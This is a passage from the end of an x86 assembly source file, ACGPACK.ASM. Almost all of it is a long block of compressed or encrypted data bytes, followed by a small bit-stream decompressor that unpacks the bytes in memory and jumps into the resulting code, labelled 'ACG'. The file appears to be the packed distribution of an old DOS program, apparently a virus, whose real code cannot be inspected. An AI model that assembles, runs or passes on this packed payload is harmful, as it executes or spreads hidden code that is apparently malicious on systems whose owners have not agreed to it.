   db 0A3h, 13h,0DEh, 20h, 7Dh,0ABh,0A7h, 8Ah, 20h,0BCh, 65h,0BAh, 40h,	87h, 41h, 1Ah
   db 0C3h, 86h, 83h,0FCh, 33h,0FDh, 66h,0A4h, 10h,0FAh, 44h, 77h,0FBh,0B7h, 76h,0E8h
   db  21h, 2Ah, 5Ch, 71h,0CCh,	12h,0CBh, 5Bh, 87h, 5Eh, 1Ah,0FCh,0FFh,0FFh, 86h,0ECh
   db 0FFh, 67h, 94h,0F8h,0FFh,	50h, 4Ah,0FCh, 28h, 6Ch,0D1h, 89h,0A0h,0FDh, 79h, 84h
   db  63h, 87h, 91h, 88h, 14h,	3Fh, 79h, 63h,0FFh,0BBh, 20h,0E2h, 1Fh,	0Fh, 7Dh, 82h
   db 0D5h, 17h, 25h,0F9h, 42h,	23h,0FFh, 27h, 48h,0FEh,0FFh, 58h, 4Fh,	24h,0FFh,   5
   db  11h, 71h, 24h,0FFh, 3Dh,	8Ah,0E4h, 1Fh,0FFh,0FFh, 7Fh, 5Fh, 37h,0F2h, 91h,0FCh
   db  3Bh, 33h, 6Ah,0A1h,0F4h,	30h,0FEh, 88h,0B4h,0C5h, 3Fh, 16h,0C5h,	8Fh,0D6h,0BDh
   db	 8,0FAh, 64h,0F4h,0F1h,	27h, 0Fh, 3Ah,0E2h,0FFh, 0Fh, 38h,0FFh,0DFh,0DEh, 7Eh
   db 0E2h, 9Fh,0E9h,0C4h,0FFh,	0Bh, 42h, 7Fh,0FFh,0BFh, 81h, 13h, 71h,0C7h, 7Ah,0E2h
   db  7Fh, 14h,0E8h, 97h, 7Ah,0BBh, 77h,0E2h, 42h,0E8h, 77h, 22h, 98h,0C9h,0E8h,0DBh
   db 0E3h,0BFh,0C1h,0F4h, 2Dh,0BAh,0D0h, 5Eh,0FFh,0FFh, 3Bh,0FCh, 98h,	33h, 74h, 8Ch
   db  7Fh, 32h, 3Dh,0E6h, 9Eh,	3Eh,0C6h,0FFh, 64h,0D2h, 0Dh,0F0h, 43h,	79h,0EEh, 7Dh
   db  38h,0ABh,0C6h, 20h, 63h,	87h, 1Bh, 0Bh,0F5h,0FEh, 9Bh,0FAh, 3Ah,0FBh, 82h, 2Eh
   db 0E6h, 4Ch, 4Eh, 1Fh,0D0h,0BEh,0AEh, 0Eh, 6Eh,0D0h,   1,0BEh,0BDh,	5Ch,0C7h,0C5h
   db 0F4h, 0Ah,0FEh,0F2h, 81h,	32h, 81h,0C7h, 72h, 80h,   5,0B4h, 2Dh,	  0, 4Ch,   1
   db 0BCh, 9Fh, 9Fh,0A2h, 1Dh,	  0,0FAh,0FDh, 86h, 1Ah, 4Bh,	9, 19h,0CEh,0FEh, 51h
   db  74h, 59h,   8,0C8h, 69h,	28h,0E6h, 9Fh,0FDh, 3Fh,0D5h,0C7h, 56h,	53h, 34h, 2Dh
   db	 7,0C4h, 0Dh, 8Ah, 0Bh,0E4h,0F9h,0C8h,0EBh,0F4h, 1Dh, 32h, 81h,	3Eh,0E9h,0D5h
   db  6Bh, 6Ch, 4Ch,0FFh,0E9h,	17h, 25h,0A0h, 63h, 53h, 79h, 64h,0CFh,	82h, 65h, 4Bh
   db  32h, 7Fh,0DEh,0BAh,0C1h,	44h,0D1h, 99h, 8Bh, 0Ah,0FBh,0F9h, 7Eh,0F0h, 4Bh, 0Eh
   db  6Dh, 22h, 74h, 99h,   4,	42h,0B5h, 7Bh,0CEh, 43h,0EFh, 0Bh,0AFh,	53h, 84h, 40h
   db 0CAh,0BAh,0B6h,0F1h,0AAh,	3Ah,0C6h, 75h, 68h,0C6h, 5Fh, 77h, 3Fh,	28h, 24h, 7Ah
   db  0Fh, 1Bh,0E9h, 2Ch, 44h,	45h, 7Eh, 97h,0B6h, 75h,   5, 74h, 7Bh,0DDh, 5Eh,0CAh
   db  4Ch,0C5h,0C3h, 73h,0FFh,0C5h, 64h, 77h, 1Fh, 29h,0CBh,0A0h, 57h,	1Eh, 81h, 1Eh
   db 0C4h,0F5h, 18h,0E8h, 0Eh,	94h,   5, 0Eh,0CBh, 0Dh,0EEh,0AEh, 77h,	6Dh, 73h,0A7h
   db  40h,0FFh, 7Bh,0A0h, 8Fh,	2Fh, 69h,   8, 8Dh,0C7h,   7, 1Dh, 49h,	2Eh, 8Dh, 1Dh
   db 0E8h,0F3h, 85h, 11h, 4Bh,	31h, 6Ch, 15h, 16h,0F5h, 4Ah, 41h,0F8h,	  0,0F4h, 6Fh
   db  1Dh,   0,   3, 12h,0BDh,0B5h,0FFh, 41h, 88h, 74h, 6Fh, 83h,0DFh,	24h,0FAh, 2Ch
   db  5Bh,0E8h,0A6h,0B5h, 5Ch,0F7h,0DDh, 51h,0BEh, 8Fh, 0Eh,0A5h, 83h,0D0h, 99h, 9Fh
   db 0CAh, 50h,0C1h, 55h,0A8h,	48h, 43h,0F1h,0A0h, 1Dh, 75h,0A8h,0C1h,	1Dh, 92h, 1Fh
   db  81h, 70h, 3Eh, 92h, 8Bh,0CBh, 8Ch, 1Bh, 4Bh,0ACh,0FBh,	7, 8Eh,0A4h,0B7h,0E0h
   db  7Eh, 17h, 1Dh, 50h, 9Bh,0BEh,0F8h, 43h, 2Ch,0A8h, 2Fh,0A1h,0F0h,	18h,0EAh,0DFh
   db 0C9h, 12h, 4Dh,0D4h, 87h,	49h, 61h, 61h, 25h,0EEh, 2Ah,0C1h,0CAh,	5Dh, 3Dh, 55h
   db  7Fh,0B5h,   1, 63h, 3Fh,	82h,0BBh,0A1h, 68h,0FBh, 5Ch,	4, 8Bh,0F3h,0D9h, 3Eh
   db  41h, 30h,0B5h,0A7h, 25h,0D5h, 25h,0C8h, 82h, 89h,0D7h, 16h, 5Fh,	20h,   8,0CAh
   db  2Dh, 7Ah, 6Dh, 40h, 87h,	4Fh,   0, 1Dh,0E3h,0D0h, 0Dh,0ABh,0ADh,	5Fh, 30h,0DDh
   db 0B4h,0F7h,0DBh, 5Ah,0C2h,	39h, 61h, 0Eh,	 1, 8Bh, 0Dh,	0, 40h,	98h,   7, 9Dh
   db  20h, 7Ch, 83h, 34h, 0Fh,	93h, 41h, 1Eh, 6Eh,0BDh, 34h,0F7h,0E3h,	59h, 5Fh, 3Bh
   db  81h, 42h,0D3h,0FDh,0E0h,	57h, 90h, 6Ah, 53h, 8Bh,0B8h,0AFh, 88h,0E8h,0D2h,0C4h
   db 0DDh,   2,0EAh, 10h, 10h,0BAh, 6Fh,0FDh,0FEh,0BAh, 38h, 74h,0B4h,0DBh,0C2h,0FDh
   db  0Ch, 0Eh, 4Fh, 8Dh, 23h,	33h, 7Fh, 76h, 14h, 9Dh, 5Fh, 75h,0FFh,0D3h,0ACh,0ECh
   db  0Ch, 0Fh, 25h,0C3h, 4Dh,0CCh, 1Fh, 97h,0E5h, 4Ch,   4,0E0h,0CFh,	26h, 7Dh, 90h
   db 0EDh, 9Ch,   9, 9Dh, 50h,	43h,0FCh, 4Dh, 3Fh, 1Eh,0CDh, 83h,0C2h,0BFh, 27h, 1Ah
   db 0B6h,0C5h,0EFh, 42h,0D4h,0FEh, 31h, 79h,0B4h,0B6h,0FAh, 4Ah, 5Eh,0C9h, 37h, 48h
   db  32h, 9Eh, 12h, 5Fh, 82h,	  8,0DFh, 29h, 56h, 3Bh, 12h, 7Fh,0A0h,	5Bh, 42h,0BFh
   db  1Fh, 5Dh,0E3h,0B5h,0E3h,	84h, 12h, 44h,0F6h, 83h, 87h, 67h, 6Dh,	7Fh,0DFh, 0Bh
   db 0D1h,0AFh,0DBh, 6Ch,0C4h,	3Bh,0DBh,0C3h, 6Eh, 8Bh,0ABh,0CEh, 45h,0EBh, 4Dh, 84h
   db 0A4h, 0Ch,0DBh,0A2h,0A9h,0DFh,0F0h, 53h,	 9,0D0h, 11h, 9Ch, 2Dh,0DEh, 7Bh, 9Fh
   db 0A3h, 78h, 6Fh,0C2h,0E3h,0FDh,0BDh,   9, 67h, 77h, 45h,0F7h, 53h,0C5h, 1Fh, 4Bh
   db  9Ch, 7Bh, 2Eh, 90h, 59h,	3Dh, 55h, 1Dh, 69h, 8Bh,0CEh,0EFh,0C5h,	69h, 4Eh,0E8h
   db	 0,0BAh, 5Dh,0F4h,0B8h,	41h, 7Eh, 94h, 7Dh,0E7h,0D4h,0FBh, 4Eh,	60h,0CFh, 42h
   db  3Eh,0DBh, 28h,0A4h,0C7h,	  9, 3Fh,0BEh,0B0h, 19h,0E5h, 94h,0C6h,	3Eh,0F5h, 33h
   db 0D8h, 14h, 89h, 98h, 8Ch,0AFh, 54h,0F0h,	 1, 88h,0E3h, 2Ah, 33h,	83h,0A0h, 0Eh
   db  45h, 10h,0C0h,	5, 91h,	60h,0DDh,0B0h, 93h, 68h,0BDh,0EFh,0FDh,0C0h, 80h, 32h
   db  8Dh,0F5h,0ADh,	3,   0,0E2h, 41h,0D0h,0F8h, 16h, 51h,0E7h,0BAh,	69h, 28h, 74h
   db  14h, 10h, 2Bh,0C4h,0A3h,0F2h, 8Eh,0CBh, 48h, 0Eh, 58h,0E0h, 89h,	2Dh,0F8h, 98h
   db 0F7h, 0Dh, 48h,	3, 89h,	41h,0A5h, 52h, 8Dh,0F7h, 53h,0B2h, 74h,	59h,0B0h, 88h
   db  31h,0ECh,0DDh, 1Dh,   8,0E5h, 20h,0E0h,0ECh, 9Ah, 12h,0B2h,0E9h,	6Bh,   2, 6Ch
   db  6Ch, 41h, 41h, 31h, 2Bh,	4Dh, 63h,   7,0EFh,0B0h,   0, 3Ah,0D8h,0A6h, 2Bh, 26h
   db 0B9h, 45h, 1Fh, 90h, 88h,	15h, 8Bh, 32h, 45h,0C0h,0FCh, 89h,0CEh,0C9h, 3Ch, 32h
   db  1Dh,0DEh, 77h,0BBh, 26h,	24h,0F4h,0D7h, 40h, 3Bh,0BFh, 5Fh, 13h,	8Bh, 52h, 78h
   db 0BFh, 6Fh,   9,0FEh,0E9h,	37h, 1Ah, 96h, 44h, 35h,0AEh, 93h, 7Fh,	6Fh,0DAh, 0Fh
   db	 2, 0Ah, 3Eh,0C2h, 2Dh,	35h,0A0h, 70h, 5Ch, 40h,0E1h, 67h, 98h,	59h, 8Fh,0DAh
   db 0C3h, 65h, 61h, 7Ah,   3,	16h,0ECh,0A6h, 1Dh, 6Ch, 55h,0A3h,0BCh,	1Eh,0DFh, 44h
   db 0D2h,0FEh, 21h, 3Fh, 96h,	82h,0EEh,0EEh,0DFh,0E0h, 4Eh, 7Bh,0B1h,	4Eh, 7Ch,0B6h
   db 0DFh, 95h, 1Dh, 95h,0CDh,	23h, 9Eh,0B9h, 70h, 47h,   2, 2Dh,   2,0F5h, 0Eh,0EAh
   db  43h, 17h, 80h,0DCh,0BCh,0D5h,0D6h, 4Eh,0D5h, 6Ch, 85h, 2Eh,0FBh,0F0h, 8Bh,0D0h
   db 0BAh, 43h,0DEh, 21h,0CFh,0E1h,0BBh,0ADh, 5Ah,0D7h, 2Dh,0F4h,0E1h,	77h, 5Ch, 0Ch
   db  5Eh, 60h, 5Fh, 9Dh, 3Ch,	75h, 3Fh, 92h,0BBh, 1Ah,0B6h, 39h, 3Ch,	67h,   6,0EEh
   db  7Fh, 73h, 95h, 33h, 3Bh,	55h,0F8h,0FFh,0F4h,   8,0FFh, 95h,0A0h,	91h,0EAh, 0Ah
   db 0BDh, 3Eh,0A7h, 3Eh,0ABh,	5Eh, 40h, 9Eh, 7Ch, 7Dh, 89h,0AFh, 87h,	17h, 52h,0BEh
   db  81h, 14h,0FFh,0FFh, 7Ah,	21h,0FEh, 7Fh,0E6h,0FFh,0FFh,0B9h, 0Bh,	94h,0E1h, 1Fh
   db 0FCh,0FFh,0FFh, 97h,0CFh,0F0h, 39h, 32h, 3Eh,0E8h,0F8h, 82h,0B4h,0FCh, 49h,0A9h
   db  1Fh, 14h, 7Ah,	0, 73h,0B9h, 40h,0FCh,0C4h,0FFh, 2Bh, 78h,0FCh,0FFh,0DFh, 82h
   db  48h,0FCh, 50h, 48h, 96h,	93h,0F6h, 52h, 75h,0C6h,0B8h,0EDh,0F8h,	33h,0A8h, 4Ch
   db  19h, 74h,   0,	8,0F8h,	9Ch, 67h, 4Ch,	 4, 62h, 3Fh, 3Fh, 50h,	59h, 84h, 58h
   db  8Eh,0C2h,   4,0F6h,   5,0AAh, 95h,0C2h, 62h, 60h, 4Ah, 7Dh, 8Ah,0FAh,0D5h, 29h
   db  11h, 19h,0E9h, 7Fh, 48h,0F4h, 0Eh,0EBh, 17h, 33h,0CEh,0E4h,0C7h,0F5h, 42h,0FDh
   db  85h,0F4h, 83h,0BDh,0A1h,0A0h, 89h, 66h, 81h,   1, 5Fh, 2Fh, 2Ah,	  3, 80h, 89h
   db  2Bh, 82h, 0Fh, 24h, 8Eh,0B4h,   5,0D2h, 7Bh, 40h, 3Dh, 81h, 0Dh,	  2, 10h, 74h
   db  87h,   8, 96h,0B0h,0B7h,0C3h, 88h, 39h,0A2h,0E1h,0C9h, 91h,0FBh,	1Bh, 74h, 95h
   db 0C5h, 23h, 37h, 80h, 78h,	14h,0BDh, 6Ch, 5Ah,0F2h, 0Dh, 1Bh,0C9h,	54h,0B1h, 2Dh
   db 0C5h, 85h, 32h,0AEh,0FEh,	97h,0F4h, 74h,0A1h, 8Bh, 9Eh,0CFh, 6Fh,0A1h, 4Ch,0FCh
   db  8Ah, 4Fh,0D1h, 30h, 6Eh,0FFh, 70h,0EEh, 7Eh,   7, 8Ah,0DFh, 4Eh,0CCh, 2Dh, 28h
   db 0FCh, 1Ch, 7Fh, 70h, 4Dh,	57h,0D9h, 0Bh, 58h,0F7h, 7Ch, 40h, 67h,	72h,0FBh,   2
   db  98h, 19h, 96h,0DBh, 64h,0A3h,0F4h,0C1h,0A2h, 2Bh, 14h, 3Ah,0ECh,	5Ah, 8Bh, 81h
   db  80h, 11h,   8, 17h,0C0h,0B3h, 8Ah,0E9h, 13h,0F4h, 20h,0E4h,0E1h,	  7, 0Ah, 9Dh
   db 0EAh, 9Fh,0AFh, 5Bh, 5Fh,	5Eh,0FAh,0F8h,0A6h,0CEh,0AEh,0ACh,0AFh,	87h, 75h, 5Eh
   db 0D9h,0ADh, 3Eh, 3Eh, 1Dh,	0Ah,0D5h, 6Bh, 8Fh, 80h,0CEh,0B4h, 7Eh,0D0h,0B3h, 52h
   db  33h,0F2h, 24h,0FDh,0FDh,0ECh, 51h,0ADh, 87h, 44h, 7Ah, 7Eh,0A2h,	2Fh,   0, 8Dh
   db  25h,0A5h,0F4h,0D7h,0FAh,	7Fh, 14h, 74h, 0Ch,0D0h,0DFh, 0Bh,0F4h,0C9h,0E0h, 2Ch
   db  90h,0BEh,0ACh,0EFh,0E1h,	57h,0B3h,0A0h, 45h, 0Ah, 86h, 39h,0F8h,0D5h, 42h, 37h
   db 0E7h, 48h, 2Dh, 5Bh,0B5h,	1Ch,0B0h, 75h, 2Ah,0D3h, 4Ch, 81h, 21h,	  6, 9Eh, 20h
   db  1Bh, 55h, 98h,0BFh,0C9h,	2Eh, 9Bh,0C5h,	 6,   0,   2, 19h, 6Eh,	50h, 3Fh, 9Bh
   db  80h,   7,0ADh,0F9h,   8,0C0h,0E6h,0EBh, 0Bh,   1,0A6h,0AFh, 95h,	9Ah,0C7h, 0Fh
   db	 3,0E1h, 8Ah, 7Fh, 5Fh,	15h,   5, 36h,0C9h,0FFh, 87h,0A1h,0B5h,	46h,0BFh, 81h
   db  7Eh, 7Dh,0B4h,0D0h,0C9h,0FFh, 47h, 82h, 1Fh,0CCh,0B2h,0EDh,0FDh,0DCh, 8Bh, 8Dh
   db  7Ch,   4, 88h,0F1h,0B0h,	64h,   7, 7Eh, 94h, 6Dh, 63h,0D1h,0B6h,	85h,0D2h,0A4h
   db  38h, 20h, 71h,0D1h, 0Eh,0A0h,0D3h,0BDh, 8Ch,   5, 50h, 66h, 43h,0C8h,0C4h, 87h
   db	 7,0C2h,0BEh, 41h, 95h,0C7h, 4Eh, 27h,0DAh,   4, 94h,	0, 94h,	61h,   0,   4
   db 0E0h, 2Bh, 25h,0CAh,0D1h,	5Dh,0AEh, 63h,0ABh,0A1h,0D7h, 61h,0D5h,0F1h, 31h, 1Ch
   db  5Bh,0FDh,0ACh,0EBh,0FFh,	68h, 17h,0BFh,0AFh, 1Ch,   4, 30h, 62h,	44h, 69h, 2Ch
   db  30h,0ADh, 3Dh, 75h, 0Dh,0AFh, 80h, 0Eh,	 3, 35h,0FCh, 31h, 0Dh,	22h,0C5h,   5
   db  1Eh,0E8h, 82h, 87h,   3,	10h,0F2h,0E3h,0B9h,0F3h, 6Ch,0DCh,0EDh,	5Ch, 14h, 95h
   db	 3, 26h, 7Fh,0E9h,0AFh,	0Bh,0BAh, 79h, 48h, 0Eh, 89h,0E8h, 19h,0A6h, 0Eh, 9Fh
   db  4Fh,0CEh, 87h, 4Bh, 53h,0BAh, 2Bh,0ABh,0F1h, 56h, 2Fh, 2Ah,0FEh,	13h,0A0h, 66h
   db 0D5h, 22h, 0Ah,0B2h, 46h,0C1h,   7,0F3h,0F7h,0C7h,0BDh, 62h,0EDh,	1Bh, 60h,0E3h
   db  2Ch,0D0h,0C7h,	6,0D9h,0A6h,0E0h, 54h,0BDh, 53h, 7Eh,0D0h, 41h,	63h, 42h,0E8h
   db  51h,0ADh,0E8h,0BFh,0FDh,0B1h,0D3h, 97h,0A6h, 83h, 1Ah, 51h,0ABh,	97h,0D2h,0E9h
   db 0ECh,0FAh, 24h, 14h,0A2h,0BFh, 80h,0FEh, 97h, 8Bh,0EBh, 9Bh,0F3h,	77h, 64h,0CBh
   db 0F1h,0BDh,0D6h, 2Dh, 30h,	0Fh, 49h,0E7h,0CCh,0D6h, 0Ch, 80h,0F0h,	9Eh,0A2h, 3Fh
   db  36h,0ECh, 73h,0B2h,0DEh,	4Ah, 95h, 14h, 8Eh, 6Ah, 7Fh,0E8h, 1Fh,	40h,0BFh,0F2h
   db 0C8h, 14h,0A9h, 43h, 40h,	7Ch, 36h, 7Bh, 51h, 5Bh, 62h, 86h, 38h,	71h,0C4h,0CFh
   db  80h, 5Dh,0C3h, 7Dh, 4Eh,	32h,   5,0E2h, 0Ch,0A0h,0CFh, 80h,0DFh,	90h,   3, 88h
   db  45h,0AFh,0CEh,0D4h,   6,	3Ah, 88h,0F6h, 84h,0F4h,0BFh, 1Ah, 0Ch,0EFh, 60h, 1Ch
   db  27h,0AEh,0C6h,0FBh,0E8h,	5Ah,0BDh,0B7h,0FEh, 8Eh,0F1h, 17h, 44h,	20h, 96h, 97h
   db  29h, 3Ah, 90h,	5,0D1h,0E3h, 5Dh,0D5h, 6Dh,0A6h, 87h,0BAh, 33h,	7Bh, 8Dh,0FAh
   db 0FEh,0F9h, 56h, 65h,0FFh,0FFh, 9Ah,0A5h, 7Fh, 85h,0CFh, 52h, 80h,0C2h, 67h,0A9h
   db 0BFh, 5Bh,0B4h,0B9h, 53h,	57h, 8Ch,0FFh, 49h,0A0h, 1Eh, 20h, 85h,	75h,0EFh, 59h
   db  8Bh, 0Ah, 88h, 25h, 1Bh,0CAh,0E3h, 97h,0CAh,0DCh,0D5h, 1Ch,0BFh,	86h,0E2h, 83h
   db  6Fh,0CDh, 7Ah, 1Dh, 1Eh,0F6h,0ABh,0BBh, 78h,0CFh,   7, 7Dh,0BBh,0E6h,   6,0E9h
   db  40h,0D7h, 6Fh,0A4h,0AEh,	8Fh, 68h, 36h, 91h, 46h, 19h, 96h,0FAh,0C7h,0AEh, 4Bh
   db  2Eh, 18h, 75h, 57h, 41h,0EEh, 87h, 20h, 13h, 8Dh,0A7h,0B2h, 90h,	  2,0C0h, 40h
   db 0B0h,0F6h, 59h,0B4h,0BBh,	3Dh, 2Ch, 79h, 42h,   7,0D9h, 86h, 9Bh,	2Bh,0CAh, 75h
   db	 3,0AAh,   9, 94h,0A5h,	23h,0FAh, 31h, 4Fh, 14h, 36h, 22h, 95h,	15h, 96h, 76h
   db  94h, 91h, 2Dh, 10h,0AAh,	3Dh,0E5h, 44h, 5Ch,0B5h,0CFh,0C2h, 34h,	  0, 5Ah, 60h
   db  35h, 3Dh, 44h,	3, 10h,	  8, 1Bh,   4,0FDh,0FAh,   0,0B9h,0D4h,0AFh,0CFh, 4Bh
   db  8Ah,   1, 1Dh, 1Dh, 74h,	17h, 72h, 9Bh,0A2h, 44h, 6Dh, 5Dh,0A1h,	17h,0D0h,0B7h
   db  74h, 15h,0AEh, 36h,0BBh,	0Eh,0CEh,0ABh, 72h,   6,   5,0E5h,0FFh,0FFh, 2Ah,0FAh
   db 0FAh, 16h, 55h, 40h, 38h,	37h,   1,0FDh, 67h, 85h, 13h, 43h,0A3h,	8Ch,0CFh,0EBh
   db  7Fh,   0, 7Dh, 79h, 8Dh,0F6h, 69h, 1Ch, 88h,   5,0D8h, 8Ch, 80h,	23h, 7Ah,0D7h
   db  78h, 8Ah,   3, 45h,   5,	83h, 9Bh,0D6h,0DEh, 37h, 22h,0ACh, 77h,	3Ah, 3Eh,0BAh
   db  75h, 36h, 0Ah, 28h, 8Ch,	  9,0E8h, 58h, 41h, 2Bh, 18h, 0Bh, 44h,0B0h, 4Eh,0DFh
   db  4Eh, 67h,0BFh, 82h,0F3h,0D8h, 2Bh, 1Dh, 45h, 55h, 13h,0E0h,0E9h,0FFh, 0Fh,0DDh
   db 0F0h, 58h, 7Fh,0A8h,0D2h,0C6h,0CDh,0C9h, 74h,0AEh, 7Fh, 76h, 21h,	2Dh, 13h,0D0h
   db  79h, 5Fh,0C6h,0BAh,0FFh,	9Fh,0D3h, 97h,0B1h, 31h, 3Fh,0FDh,   3,0F6h,   0, 58h
   db  36h, 1Dh,0E9h, 60h, 40h,0FEh, 68h, 49h, 7Dh, 32h,0B1h,	9, 44h,	12h, 5Dh, 0Ah
   db 0E2h, 92h,0FCh, 8Dh,0EBh,0F8h, 23h, 7Dh,0A6h,0E4h,0D1h, 0Fh, 45h,	26h, 34h, 5Eh
   db  58h, 9Fh, 74h, 94h, 87h,0ADh,0EBh, 5Fh,0A4h, 5Eh, 23h, 74h,0F5h,	  1, 12h, 72h
   db  82h, 7Bh,0EBh, 54h, 0Fh,	4Fh, 0Eh, 82h, 1Ah,0EDh, 63h,0F8h, 14h,	21h,0F6h, 34h
   db 0D7h, 4Fh,0FFh,0EAh, 1Fh,0EEh,0C4h,0FFh,0F6h,0E9h, 59h,0A3h, 5Dh,	4Ch,0EFh, 6Ah
   db  55h, 67h,0DCh, 3Ah,   3,	26h, 15h,0F7h, 65h, 3Ah, 0Ah,0A4h,0A4h,	1Eh, 41h, 1Dh
   db  6Fh,0FEh, 9Ch, 1Fh,0BCh,0EAh,0FBh,0E9h, 28h, 26h,0DDh, 60h, 5Fh,0BDh,0E6h, 71h
   db  9Ch, 70h, 1Bh,0C2h,0F0h,	  0, 14h, 6Bh,0B5h,0FAh,0BAh, 56h,0B1h,	13h,0EFh, 4Bh
   db  2Dh, 61h, 47h, 26h,   0,0A4h, 5Bh,0FDh, 5Ch, 64h,0EDh,0F8h, 98h,0FDh,   5, 75h
   db  6Ah, 86h, 2Fh,0A0h,   0,	  1, 5Fh, 52h, 59h,0DBh, 0Dh, 18h, 22h,	4Ch,0EFh,0DFh
   db  62h,0D0h,0B0h, 6Eh, 13h,	39h,   6, 63h,0E4h,0CFh,0D3h, 23h, 21h,0A3h, 5Fh, 0Dh
   db 0A5h,0D7h,0F7h, 6Ah, 0Ah,	90h, 50h,0C2h,0F1h, 16h,   7, 81h,0A5h,	36h, 3Fh, 30h
   db 0D0h, 95h, 40h, 17h, 57h,0B1h, 69h, 61h, 9Ah, 32h, 31h, 8Ah,0A9h,0CAh,   2, 4Ch
   db 0D8h, 5Ch,0F1h,0C4h, 18h,0E4h, 7Dh, 40h, 4Fh, 30h, 27h,0F3h, 91h,	  9,0A9h,0E8h
   db 0B0h,0EEh, 5Bh,	3,   7,	40h, 3Dh, 30h, 85h,0B0h, 60h,0FCh, 8Eh,0A5h,0AAh,0E6h
   db 0C8h,0E5h, 70h, 54h, 69h,0F0h,   3, 70h,0B1h,0C7h,0C8h, 98h,   6,0F8h,0D4h,0A9h
   db  2Dh,0B6h, 97h,0ABh, 5Bh,	63h, 83h, 77h, 7Dh, 81h, 86h, 94h, 57h,	67h,0C0h, 83h
   db  33h,0FEh, 25h,0B6h, 1Bh,0EAh,0FFh, 6Dh, 8Bh,0A2h, 7Ch,0BDh, 87h,	71h, 52h, 6Dh
   db 0EAh,0E0h,0E6h, 35h,0B4h,	31h, 8Ah,0E4h, 6Bh, 6Bh, 44h, 7Fh,0EDh,	97h,   1, 5Dh
   db  4Bh, 55h, 0Fh, 55h, 5Ch,0A1h, 4Dh, 26h,0E6h,0E3h, 3Eh, 38h,0F9h,0FEh, 1Bh,0CBh
   db  82h,0C0h, 4Bh,	2,0A3h,0CEh, 11h,0B6h,0C2h,0A3h,0B0h,0DDh, 6Dh,0DDh, 42h, 7Fh
   db  7Eh,0BEh,0A0h, 64h,0D0h,	6Ah, 0Bh, 0Bh, 1Fh, 57h,   3, 5Bh, 41h,	96h,0C4h, 54h
   db  55h, 9Bh, 42h,0E8h, 82h,	1Eh, 40h, 62h,0F3h,   2, 9Dh,0A8h,   9,	17h, 26h,   8
   db	 4, 4Ch,   8,0A6h, 75h,0B0h,0DDh, 54h, 0Ch, 43h,0CDh,	4,   0,	7Eh, 9Bh, 80h
   db 0FDh,0F8h, 57h, 22h, 8Ah,	29h,0ACh, 24h,0C9h,0A6h,   3, 9Bh, 81h,	44h, 90h,0CDh
   db 0EBh,0A4h, 55h, 27h, 6Ch,	86h, 61h, 5Ah, 44h,0C6h, 5Eh,	8, 1Dh,	  2,0F0h,   0
   db 0C0h, 98h, 19h,0DFh, 76h,	18h,   1, 40h, 93h, 23h,0DCh, 36h, 91h,	62h, 46h,0B9h
   db 0D6h, 31h,0B5h, 86h, 6Dh,0C0h,   8, 68h,0CAh,0CAh, 81h,0A8h, 20h,	35h, 0Dh,0A1h
   db  84h, 83h, 8Ch, 20h,0A1h,0C0h, 43h,0C4h, 94h,0FAh, 60h, 94h,0B0h,	52h, 2Eh, 68h
   db  17h, 38h, 71h, 0Ah,0D2h,	43h, 50h,0E2h, 4Ch, 2Ch, 48h, 20h,   1,0C4h,0D4h, 0Ah
   db  88h, 67h, 2Dh, 16h, 8Ah,	13h, 7Bh, 50h, 92h, 0Ah, 71h, 5Eh, 71h,0D4h, 8Ah, 13h
   db  12h,0D2h, 2Eh, 0Bh, 17h,	  9, 69h,0A4h, 44h, 76h, 5Dh, 31h,0F1h,	44h, 7Bh, 20h
   db  0Dh, 79h,0DBh,	7, 8Ch,	2Bh, 78h,0E2h, 4Fh,0C4h, 46h, 8Fh,0F1h,	  7,0E5h, 82h
   db 0DEh, 11h, 20h,0B2h, 21h,	0Ah, 0Ah, 20h,0FFh, 58h, 80h, 3Bh,0FFh,	7Fh, 41h,   0
   db	 0,0FCh,0FFh,0FFh

; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


getBIT proc near
   dec	dx		 ; check number	of bits	left
   jnz	GetBit2
   xchg	ax, bp		 ; save	AX
   lodsd		 ; load	bits in	EAX
   xchg	eax, ebp	 ; restore AX and leave	bits in	EBP
   mov	dl, 20h

GetBit2:		 ; CF =	bit from EBP
   shl	ebp, 1
   retn
getBIT endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


getNbits proc near
   xor	ax, ax

loc_0_1F15:
   call	getBIT
   rcl	ax, 1
   loop	loc_0_1F15
   retn
getNbits endp

; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

Unpack_N_Bytes:
   mov	bx, 0FFFFh
   xor	cx, cx

Increment_ECX:
   inc	cx
   call	getBIT
   jb	Increment_ECX
   cmp	cl, 20h
   jnb	End_Compression
   push	cx
   sub	cl, 2
   sbb	cl, -(2+3)	 ; CL += (CL<2 ? 2 : 3)
   cmp	cl, 7
   jbe	loc_0_1F3B
   mov	cl, 7

loc_0_1F3B:
   call	getBIT
   jnb	not_too_far	 ; jump	if relative offset isnt	too far
   shl	bx, cl
   dec	bx		 ; BX =	((BX <<	CL) - 1)
   shl	cl, 1
   dec	cx
   dec	cx		 ; CL =	(CL*2 -	2)

not_too_far:
   call	getNbits
   sub	bx, ax		 ; calculate relative offset
   pop	cx		 ; ECX = number	of bytes to copy

CopyBytes:		 ; get repeated	byte
   mov	al, [bx+di]
   stosb		 ; store it
   loop	CopyBytes

Unpack:
   call	getBIT
   jb	Unpack_N_Bytes	 ; jump	if not stored method
   mov	cl, 8
   call	getNbits	 ; get 8 bits in AX

StoreByte:		 ; store byte
   stosb
   jmp	short Unpack	 ; unpack more bytes
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

End_Compression:
   pop	es
   assume es:nothing
   pop	ds
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
   assume ds:nothing
Jump_to_ACG db 0E9h	 ; (this instruction is	executed in offset 3FFDh)
   dw (102h - 4000h)
Unpacker_End db	0F0h	 ; Check Byte
seg000 ends


   end 
ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ[ACGPACK.ASM]ФФФ
